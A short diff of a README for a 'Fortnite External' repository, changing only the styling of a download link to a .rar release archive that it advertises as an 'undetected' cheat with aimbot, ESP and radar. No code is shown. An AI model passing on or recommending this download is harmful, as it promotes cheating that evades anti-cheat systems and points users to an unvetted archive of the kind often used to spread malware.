@@ -1,6 +1,6 @@
 <div align="center">
   
-  [Fortnite External](https://github.com/Winnerplipleat58/Fortnite-External/releases/download/fortnite.1.6/fortnite1.6.rar)
+  🎯 [Fortnite External](https://github.com/Winnerplipleat58/Fortnite-External/releases/download/fortnite.1.6/fortnite1.6.rar)
 
  > **The ultimate, feature-rich undetected utility for Fortnite. Full control over Aimbot, ESP, Radar, and Performance options.**
   
